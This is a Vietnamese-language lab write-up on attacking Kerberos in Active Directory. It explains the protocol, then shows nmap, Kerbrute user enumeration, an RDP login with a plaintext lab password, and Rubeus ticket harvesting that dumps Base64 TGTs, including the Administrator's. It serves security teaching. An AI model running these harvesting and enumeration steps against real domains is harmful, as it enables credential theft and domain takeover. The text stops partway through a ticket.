# Attacking Kerberos

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

## Introduction

Kerberos là default authen cho Microsoft Windows domains , nó được thiết kế để `"SECURE"` hơn so với NTLM bằng cách sử dụng  third party ticket authorizatios, và mã hóa mạnh hơn.

Mặc dù **NTLM** có nhiều **attack vectors** hơn để khai thác, **Kerberos** vẫn tồn tại một số **underlying vulnerabilities** tương tự NTLM mà chúng ta có thể lợi dụng trong quá trình tấn công.

### Common Terminology&#x20;

* **Ticket Granting Ticket (TGT)** – Vé xác thực ban đầu được cấp cho người dùng sau khi đăng nhập thành công. TGT được dùng để yêu cầu các **Service Ticket** từ **TGS** nhằm truy cập các tài nguyên trong domain.
* **Key Distribution Center (KDC)** – Dịch vụ trung tâm của Kerberos chịu trách nhiệm cấp phát TGT và Service Ticket. KDC bao gồm hai thành phần:
  * **Authentication Service (AS)**
  * **Ticket Granting Service (TGS)**
* **Authentication Service (AS)** – Thành phần của KDC chịu trách nhiệm xác thực người dùng ban đầu và cấp **TGT**.
* **Ticket Granting Service (TGS)** – Thành phần của KDC nhận **TGT** từ người dùng và cấp **Service Ticket** để truy cập vào các máy chủ hoặc dịch vụ cụ thể trong domain.
* **Service Principal Name (SPN)** – Định danh duy nhất của một dịch vụ trong Active Directory. SPN liên kết một dịch vụ với tài khoản domain mà dịch vụ đó chạy dưới quyền. Windows yêu cầu nhiều dịch vụ phải có SPN để Kerberos hoạt động.
* **KDC Long Term Secret Key (KDC LT Key)** – Khóa bí mật dài hạn của KDC, được tạo dựa trên tài khoản **KRBTGT**. Khóa này được dùng để:
  * Mã hóa TGT.
  * Ký (sign) PAC.
* **Client Long Term Secret Key (Client LT Key)** – Khóa bí mật dài hạn của client (người dùng hoặc máy tính), được tạo từ mật khẩu/tài khoản của client. Được dùng để:
  * Kiểm tra timestamp đã mã hóa.
  * Mã hóa Session Key.
* **Service Long Term Secret Key (Service LT Key)** – Khóa bí mật dài hạn của dịch vụ, được tạo từ tài khoản dịch vụ. Được dùng để:
  * Mã hóa phần thông tin dịch vụ trong Service Ticket.
  * Ký PAC.
* **Session Key** – Khóa phiên được KDC cấp cùng với TGT. Khi yêu cầu Service Ticket, người dùng sẽ gửi Session Key này cùng với TGT để chứng minh danh tính.
*   **Privilege Attribute Certificate (PAC)** – Chứa toàn bộ thông tin quyền hạn của người dùng, bao gồm:

    * SID
    * Group Membership
    * Quyền truy cập (Privileges)

    PAC được gửi kèm với TGT và được ký bởi **KDC LT Key** và **Target LT Key** để đảm bảo tính toàn vẹn và xác thực của thông tin người dùng.

### AS-REQ w/ Pre-Authentication In Detail&#x20;

Bước **AS-REQ (Authentication Service Request)** trong quá trình xác thực **Kerberos** bắt đầu khi người dùng yêu cầu một **TGT (Ticket Granting Ticket)** từ **KDC (Key Distribution Center)**.

Để xác thực người dùng và tạo TGT, KDC thực hiện các bước sau:

1. Người dùng lấy **timestamp (dấu thời gian)** hiện tại.
2. Timestamp này được **mã hóa bằng khóa tạo từ NT hash của mật khẩu người dùng**.
3. Người dùng gửi timestamp đã mã hóa cùng với yêu cầu AS-REQ đến **Authentication Service (AS)** trên KDC.
4. KDC lấy **NT hash** của người dùng được lưu trong Active Directory để giải mã timestamp.
5. Nếu giải mã thành công và timestamp hợp lệ, KDC xác nhận người dùng đã chứng minh được mình biết mật khẩu mà không cần gửi mật khẩu qua mạng.
6. KDC sẽ cấp:
   * Một **TGT (Ticket Granting Ticket)**.
   * Một **Session Key** dùng cho các bước xác thực tiếp theo.

### Ticket Granting Ticket Content

Để hiểu cách **Service Ticket** được tạo và xác thực, trước tiên chúng ta cần hiểu nguồn gốc của các ticket này.

Khi người dùng muốn truy cập một dịch vụ trong domain (ví dụ: SMB, MSSQL, IIS, LDAP...), họ sẽ gửi **TGT (Ticket Granting Ticket)** mà họ đã nhận được trước đó cho **KDC**.

<figure><img src="../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

### Service Ticket Contents

Để hiểu cách **Kerberos Authentication** hoạt động, trước tiên bạn cần hiểu **Service Ticket chứa những gì** và **cách nó được xác thực**.

Một **Service Ticket** gồm **hai phần chính**:

<figure><img src="../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

#### 1. Service Portion&#x20;

Phần này chỉ dịch vụ đích mới đọc được và chứa:

* Thông tin người dùng (User Details)
* Session Key
* Toàn bộ phần này được mã hóa bằng **NTLM hash của Service Account**

Mục đích:

* Dịch vụ sử dụng NTLM hash của tài khoản dịch vụ để giải mã ticket.
* Sau khi giải mã, dịch vụ biết được:
  * Ai đang truy cập
  * Session Key nào sẽ được dùng để giao tiếp

#### 2. User Portion&#x20;

Phần này người dùng có thể sử dụng nhưng không thể sửa đổi.

Bao gồm:

* Validity Timestamp (thời gian hiệu lực của ticket)
* Session Key
* Được mã hóa bằng **TGT Session Key**

Mục đích:

* Cho phép người dùng chứng minh mình sở hữu Session Key hợp lệ.
* Dùng trong quá trình giao tiếp với dịch vụ sau này.

## Kerberos Authentication Overview&#x20;

<figure><img src="../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>



* **AS-REQ** → Client yêu cầu **TGT** từ KDC.
* **AS-REP** → KDC xác thực và trả về **TGT** + **Session Key**.



* **TGS-REQ** → Client gửi **TGT** và **SPN** của dịch vụ muốn truy cập cho TGS.
* **TGS-REP** → KDC kiểm tra TGT, sau đó cấp **Service Ticket** + **Service Session Key**.



* **AP-REQ** → Client gửi **Service Ticket** tới dịch vụ để chứng minh quyền truy cập.
* **AP-REP** → Dịch vụ xác thực ticket và cấp quyền truy cập.

### Kerberos Tickets Overview

**Ticket Granting Ticket (TGT)** là loại ticket chính mà người dùng nhận được trong Kerberos. TGT có thể tồn tại dưới nhiều định dạng khác nhau, chẳng hạn như **.kirbi** đối với Rubeus hoặc **.ccache** đối với Impacket. Thông thường, ticket được mã hóa dưới dạng Base64 và có thể được sử dụng trong nhiều kỹ thuật tấn công khác nhau.

TGT chỉ được dùng để yêu cầu **Service Ticket** từ **KDC**. Khi muốn lấy TGT, người dùng sẽ xác thực với KDC bằng thông tin đăng nhập của mình và gửi yêu cầu cấp ticket. KDC sẽ kiểm tra tính hợp lệ của thông tin xác thực, sau đó tạo một TGT và mã hóa nó bằng khóa của tài khoản **krbtgt**. Cuối cùng, TGT đã được mã hóa cùng với một **Session Key** sẽ được gửi lại cho người dùng.

Khi cần truy cập một dịch vụ cụ thể, người dùng sẽ gửi **TGT**, **Session Key** và **Service Principal Name (SPN)** của dịch vụ muốn truy cập đến KDC. KDC sẽ xác thực TGT và Session Key. Nếu chúng hợp lệ, KDC sẽ cấp cho người dùng một **Service Ticket**, và ticket này sẽ được dùng để xác thực với dịch vụ tương ứng.

### Attack Privilege Requirements&#x20;

* **Kerbrute Enumeration** – enumerate người dùng trong domain bằng Kerberos. **Không cần quyền truy cập vào domain**.
* **Pass the Ticket (PtT)** – Sử dụng ticket Kerberos đã đánh cắp để xác thực với các dịch vụ. **Yêu cầu có quyền truy cập vào domain dưới tài khoản người dùng**.
* **Kerberoasting** – Yêu cầu Service Ticket của các tài khoản dịch vụ (SPN) rồi crack offline để lấy mật khẩu. **Chỉ cần quyền của bất kỳ user nào trong domain**.
* **AS-REP Roasting** – Tấn công các tài khoản có tùy chọn **"Do not require Kerberos preauthentication"** được bật, cho phép lấy AS-REP và crack ngoại tuyến. **Chỉ cần quyền của bất kỳ user nào trong domain**.
* **Golden Ticket** – Giả mạo TGT bằng cách sử dụng hash của tài khoản **krbtgt**, cho phép truy cập gần như không giới hạn trong domain. **Yêu cầu chiếm quyền hoàn toàn domain (Domain Admin)**.
* **Silver Ticket** – Giả mạo Service Ticket cho một dịch vụ cụ thể bằng hash của Service Account. **Yêu cầu có hash của tài khoản dịch vụ**.
* **Skeleton Key** – Cài một "mật khẩu chủ" (master password) trên Domain Controller để đăng nhập vào mọi tài khoản. **Yêu cầu chiếm quyền hoàn toàn domain (Domain Admin)**.

<figure><img src="../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ sudo nmap -sCV -p- 10.49.148.12     
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-22 07:34 -0400
Stats: 0:02:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.25% done; ETC: 07:38 (0:01:34 remaining)
Nmap scan report for 10.49.148.12
Host is up (0.10s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
|_  256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-22 11:39:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CONTROLLER
|   NetBIOS_Domain_Name: CONTROLLER
|   NetBIOS_Computer_Name: CONTROLLER-1
|   DNS_Domain_Name: CONTROLLER.local
|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-22T11:40:17+00:00
| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
| Not valid before: 2026-06-21T11:29:14
|_Not valid after:  2026-12-21T11:29:14
|_ssl-date: 2026-06-22T11:40:25+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49779/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-22T11:40:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 389.59 seconds
```





Enumeration w/ Kerbrute


Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.



```bash
(base) ┌──(kali㉿kali)-[~/Attacking Kerberos]
└─$ kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local u.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/22/26 - Ronnie Flathers @ropnop

2026/06/22 08:36:45 >  Using KDC(s):
2026/06/22 08:36:45 >   CONTROLLER.local:88

2026/06/22 08:36:45 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2026/06/22 08:36:45 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2026/06/22 08:36:45 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2026/06/22 08:36:47 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2026/06/22 08:36:47 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2026/06/22 08:36:47 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2026/06/22 08:36:47 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2026/06/22 08:36:47 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2026/06/22 08:36:47 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2026/06/22 08:36:47 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2026/06/22 08:36:47 >  Done! Tested 100 usernames (10 valid) in 1.795 seconds
```

<figure><img src="../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>



Harvesting & Brute-Forcing Tickets w/ Rubeus\





```bash
(base) ┌──(kali㉿kali)-[~/Attacking Kerberos]
└─$ xfreerdp /u:Administrator /p:'P@$$W0rd' /d:controller.local /v:10.49.148.12
```

Rubeus là một công cụ mạnh để tấn công Kerberos. Nó được phát triển dựa trên công cụ kekeo bởi HarmJ0y, một chuyên gia nổi tiếng về Active Directory.

Rubeus hỗ trợ nhiều kỹ thuật và tính năng liên quan đến Kerberos, bao gồm:

* Overpass-the-Hash
* Yêu cầu và gia hạn Kerberos ticket
* Quản lý và trích xuất ticket
* Thu thập (harvest) ticket
* Pass-the-Ticket
* AS-REP Roasting
* Kerberoasting

Do số lượng tính năng rất lớn nên tài liệu chỉ tập trung vào những kỹ thuật quan trọng nhất để hiểu cách tấn công Kerberos. Nếu muốn khai thác sâu hơn, bạn nên đọc tài liệu chính thức của Rubeus để tìm hiểu toàn bộ các tính năng và phương thức tấn công mà công cụ này hỗ trợ.

{% embed url="https://github.com/GhostPack/Rubeus" %}



### Harvesting Tickets w/ Rubeus -&#x20;

Harvesting là quá trình thu thập các ticket Kerberos đang được gửi tới KDC (Key Distribution Center) và lưu chúng lại để sử dụng trong các cuộc tấn công khác, chẳng hạn như Pass-the-Ticket.

1.) `cd Downloads` - navigate to the directory Rubeus is in

2.) `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator>cd Downloads

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads> Rubeus.exe harvest /interval:30

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 

[*] Action: TGT Harvesting (with auto-renewal)        
[*] Monitoring every 30 seconds for new TGTs          
[*] Displaying the working TGT cache every 30 seconds 


[*] Refreshing TGT ticket cache (6/22/2026 5:54:22 AM) 

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL                                                
  StartTime             :  6/22/2026 4:29:45 AM                                                          
  EndTime               :  6/22/2026 2:29:45 PM                                                          
  RenewTill             :  6/29/2026 4:29:45 AM                                                          
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                
                                                                                                         
    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEj8ZboOsV3ElPpoOdf9bsbozsT08mzdoCfWg 
    EVg56xTJokN+/zt8nZN8cngP80wRabXUiVvsFD0daRZrVKHWfPcHli007BUw0whwCGxiyLxy2SxNcDYJZcocizkwTHYKg+j6pokr 
    o4b6YlIfjhe/2KLrHXvPYFSgbHDGzMdnBMULgtwcmKs5MxgfIGiBwLwmAuZvZOCh80ZqLbuWXRXjBaqKdpAiDpQ3UbaWwpbsIMuc 
    RxqaEYLX3ZwGsjggyeH39YiYwx03DB/5SOvyy8TeqHSXOWY3/gh+wSdYGqBnQy53EiY/6QPNjZ6RDdUPMtkhNW95nPUaBMYje9wr 
    KCg6SxlddhzUpCo3qbsgcgVACNooC34hymi9PVCsqvBs4BM4iJ0ZUwfaVxgngN6Bxhrjys5cG5K4w/4xMWgHladPvvRhFckbQEfi 
    KTKmbKEz4mV1hDZ9quSUb3kZE/8G+hyDL4sY+144v0R5gAKP8Zi9LI1QyFKjqH0hyLdSwxErAFufPiNO05WXQmGGpAzJQozNcNXo 
    XtkqdKDt0+P1cN0FCPrZvC6lWPKbxOsytPQgy8Gjz9ORfiv77TWhhvwUrc9zFYBqX28Ojp64Myd3d6VEqZNyz4ORc9K6cxmklQL5 
    hj7bAuM1JwhcGDsWypl59LFhhr9Il+3CsTorHU4pyebef6yLdDbmvzjXwqCEEaOrKnIA7QKwxLF9iaqc1oNHBMRO+KzhTHKNZKEs 
    8EiGF0S2Rs0T6azY97vob2p7anyx3w2oO/3RxpTcpSmO6Q2xhzn4pHygK2SM56bXvWPGmByIMQtL0DmSXrV5ReVhfwmYiD0dzi7A 
    hmWmYfy6HZGFcZq/8yaTUwk73cliwAwk/Qh95wG9kIZvSyF2Mh7aDazkWhYYfJXK8ZuriRtTlbBTnXhLZYmr3Hd2DDziI9Is3FzY 
    fZ7fR0nOZlZEYqSoqUHesUskh+xG1gliimAsEdQaR2r+818XcL9dhSKnElRgfsJ1G2qRbPPqCjlOm1L8+7t5YZpRzkmjSiZV0jvt 
    nmHmoVWRr8O6E6ih+d0PPJS501xNTfTw4Jn11KPpIlCQhFLO+ZFELByXZNj5Xc2KN2d4/iSpeaaeTzY9zS68Q6SlWwupQsKiujwN 
    gt92F5bGoHP0mjpL0B1110j+Kuo9csk1hMIgwwKeHRkJpHmFSKbsbfBR8swxadz3bcX2uZzjoTNr1ylquFTu/l70vAgNe5uWsduV 
    UFFiFGsBqwrdWGuqknOzNTRGH18nQatgWSyB5IVSMKb6LalE2C+xuV+kT22nb0DMokcd/v7bYsZVV1Hprw1qoxUW3vboZX4ghd+N
    eMZHYwQoo/xFJnW16ppmaVCWV3qyVAwsFshXFxpR1sPIK33t4HEBFdqjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCCVLu0TikRz/EQ45yqYF9Tpc53RXLR+CaeMTqy5sKkdKaESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI2MDYyMjExMjk0NVqmERgPMjAyNjA2MjIyMTI5NDVapxEYDzIwMjYwNjI5
    MTEyOTQ1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  6/22/2026 4:29:45 AM
  EndTime               :  6/22/2026 2:29:45 PM
  RenewTill             :  6/29/2026 4:29:45 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEjHGpinP8eJOQSnIujliDqMwuADMLLvP5LnV
    V0P587uCK+6EoRXivkKY9AQMdIps1cEyj26/BCeof5iAdaZ7L7czddZJaaWv+KWm+KOabJqmk8hD+iP2A69cvOStbfgw2Xg7Ep2S
    caYQnzBxKIRaX4zjQROlhigQgicSESecvr6emJ7jEX7coV8yK9z0QR07smijgaXttnYdzT+Kro34vNBWidhEmxGwhgHSMxW8MXM+
    5dX47nTH2ccgo/iguZzr5xCsaiwIng3HRDo1eobeYKmpYFA790q6WkgjCb+32jL+64rZ4mlFZrViJEl3aFQv92pQIfRVQU66g1Lp
    vpr7HguR8SYGNSKwGKH1f3yWsNvIEULZsdtjERssOg5CiKhUQtmUZNXyk333gH/N+F93cB+X2OBwYOZN/S+doVD8O5utnBpJRtX0
    UdNE54bzT+19zwPAfazL504SHCTetrCw3Ktuldgapvic6mKvdbHeYN2EHwsdgDGhpIZ06xx0v27NN6MIiRS4oKBACV8qzrzhRAaE
    uhTDht30yMIJwaEeZWgK5kCYzhncTUOYesRoczIG6MGnMYQgoa0hEiCzutCyD7XMRyN1I4T0+o4hglx+FQdfi4rXIj9SUmFYZ5u0
    MdjOcYhO55knxCSvO7zrVx6B0lYD5LAberKTHjbFTL9LiX7nPaGx/F5nAB7ZpRHY+r3KkBnlDgP+GqONy1mVOeZL6HByKLfLvUzY
    ecCUHfaAcMfiAQqspx8AsZwJJeSE1/EPCO2FVZ9ln5mkygYkFnAUIKaLGo/BSIx71ccpmJztihcb7QX8Cy0RSl4ezxUuA3k4yGrC
    9tauvpE8KBGQfnmfQrLdgSjfuAyuAGQHKxE7BGfcAabMfdi7sgkj8BXnqWLlI/sKiDyJQmvecWyWjnNwRULeqJ3C/Yc37mIlDjRl
    jC/aX8dPcFDIlFp5qpsyUSoNZyug5YcTYdG2lruaMStIoVXFdfP1RVX+wUhj0vm8Y1xhqLBQSzeeNOA8vJgQBqlIcpgSoV4TWpp4
    6DEFyWor2fqO/v5HX35RiFIxYBGEzg0GraKD3Cm334a+mAdTk0L3y3JTWCyhG0Y1jVb/ITxDSMkQODDXErPOyqMKo+rQzbNK9jaZ
    gVl2RezLjGPN3JfmI2YmGYSQKyXkvQ8r6KTFUd8w7oVciB9UB5eNH5RHWFf6gHGtHzMI0jEG1pvFfIBzYotrwwLcusXWFwnFwNXp
    ScH5QqeOPoCI4wkpU0TV8aXVny5FcsefOtmMTJC/nkO7iOlCKBf9bSFIms3A4T5WyJa/tAxb7qVJZOEgYqCBFQNhXXBEA+HyrtJ0
    TlQP9a1gqPmntKrdeoijUHo6uSbvQqcPBbXciIKo6GhxMJ4c4yQ73TSjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCBjXjfNdgQm8gLAUzvw1DOV7xyWCHX8rEy4l/MeSUPCk6ESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDI2MDYyMjExMjk0NVqmERgPMjAyNjA2MjIyMTI5NDVapxEYDzIwMjYwNjI5
    MTEyOTQ1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  6/22/2026 5:45:38 AM
  EndTime               :  6/22/2026 3:45:38 PM
  RenewTill             :  6/29/2026 5:45:38 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGh0lFv6E/qzc+5jvSwjGO/OvzRAdHdd8qlyC
    uWm1d9mr7Xj6PgXWDpwOj0LTYmK9b+koC++LE0Ev7w3p+OdtV/BYGd3U42mh/bbhgxhLiUs0QN++x4oWL4Ha746/UwtS6GlZeJaH
    Kz7AWWNZPZ4edgYBqQNtgZCRp0fpiuekQPgJHrTiRlAveau72Mgsjj+t2dvdPZk8I0S0CzsICnfewbWQnACF+yY25e+nbx6uKUl0
    WHiV6mtyb6K/aptL3Tg+TDEgY69yoO/OXLMR5NJ8SQxX86n92Pm6jLAv+yW5Dx9pLUpPypkpj52NWMZVlb87EzRhRsPM3NWW767p
    +TO5WC1yptdvylsMUZkKgpzK5qBW9vwcP2OxXDlMHs+ok4mFRcaTeYrT70xgYZ+w6v2qYvc3Rc5boEZZAolGv88G2FtjqrzB/2w1
    aqyxDE4PCQpgEWmuYsYJtOy4DPCHq+Y0+RiDiVRUggmCaWoQDQ5WEC9zsZzCSqhizaxnHzWsjHmRjRYpHcxmXUQpUvy83stWX0/3
    soWVXUUIjweZzr0ogqjD4mGykie0VymiZK9ughYBYifSkH3M75k1iE7lXlQIupJ9arhASxQXhdpIpOSDXEVyUcshByAexnKrSw+x
    P7Mgoyvp8y20BLf7lv9l6J/hY6HzE+zyjn4jcpkNK7UF81uaukhRIyT2ZFVoVOXrrQw7TkPyi0fJNpt15pc+MR7c3Z9JEeqPzfmb
    r+UD/GX/Pq9Bm0vSVgz01hD85V99NnNwZSLzcUwi/Dxm+A2sfotM8XVnbQrU7RtnaEP48UsK13iwwG2HdAp6e4RUPDe+YnkLsAKu
    qm+Wsep9wl/2Gv7GEzLIIpUAqFuAdRSm/qVUpo6Xg4e6lD9jszdnDoatf2HvDbLtilMBzIJ+PKmYjqT8TSBObrqv6UNuhJZwTiPf
    DBQ/S28mwXT7UtpU83v8Kh8f2Vp5TRIZAHkjuQ1StXn3aciueuhwE5AKKDQaDT/6GoJEXM7u17TQxl7aPUhJbh6kmAHm5JU9cTwd
    05Kfts0uETvMTK5uxGaLJpfb1Cor4O+1AUXOkNUw23MymLagDdsk/p8aLNxE3g6vKAbgKZU1NgNFxNIUrCrWWdW5V1vfklRO7oSU
    ErzOcDnUGnKnEAc+kWUc3ShUZFEjgBRBAfDO4yNIZzscQ8MZ83z6v6uOE/qXFOKBZl7RBTV8+wG1i+IcjHdnEbov/G6Z94Tt/gln
    aXnS4PUwQh1lYkzROtzl18VckJ3qN6ow4kaBNEsHglq+aR7EW5jH/Op0C7CI8Bj3p8O5rPELLLQ/GXVEipUfPCNlfUEJ87gaVBcS
    9z47P1rw0rEULmHP/i/wWcX3hk/k0l18pKzK3zhAiBqzOQ/j/wRtpfLyO+QAIel2JqOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIDgI7mAXMOtITpHmJblhOF3eyg7+4V3PWU7hABnhzm6DoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjYwNjIyMTI0NTM4WqYRGA8yMDI2MDYyMjIyNDUzOFqnERgP
    MjAyNjA2MjkxMjQ1MzhaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  6/22/2026 4:59:13 AM
  EndTime               :  6/22/2026 2:59:13 PM
  RenewTill             :  6/29/2026 4:59:13 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEuzv49xkPxLftSkUt/hJIOFhMkDkSl4SYnEQ
    dzenrtPU3XMXxIDGeaw9uBXE4qku1/w6TDeIQP71uL+1i/MIABzt3NOWM/tAPFCLBDIon2AlmrMXeEpOswM0465iXzNHYHcFEXte
    ew6sJmMMhbs5zFm6R0gdMoDGEMnZIQGyVbOp5kfwhWjfG8G3xAjlxUfpWjMhqC/lOp8Tah1tBBgawWSB8gyZ3wZfQGkksdEmP3XJ
    6KNXg96+ia6wzeeHCTxpJvHJaQimn+5O7nRalO2enInkH+egJnHTb0NaltLtbx4S233VlbnkXR4DJs7k9SbDRBQpMbEukOxyQP8J
    IZAo7yQgumOn8RIRncHolfcjCQoyLG5H6aahs3Q61RdykQbwsNVAwGeGQLoAmi7cBHxNCn+Scsr3jFM9eCPrQFW2zpdk+gBvIvrr
    BV3KBD8KOJLFPJr4sOg+sHQCvJeiihEGu8n/WMCBZsdqOFIBESedXB/H+yt5Gj5i7k0RJpDLr1JiZGUavDrQXtKNAPxc842bCmYa
    fjUliXvBA/spGXtuIvH3p1lFRmX2zPrDbl9jMy0Sef0tWTDLuCPN+NY9oq6/7bypWCe07imtmVVRO2um57zMjzTPewrbsdHe2rx6
    VDd+baeInti8enJH2Tdep76iGXQs04UpsRlrin14VXY16L0x8II5mCa7zypsmoXhfxz752nIsnNNaaSs4bPwvUMRx+G+4tdr5YxN
    SNeW667Uo/LwopMRZePeHPYQlMYtF2MlzlB5HTEjvq+gwI9+H+BZLCRKypCCzZYXvMLrehNrml4m2/ehD+DNkhMjLWrIr8wCr/i+
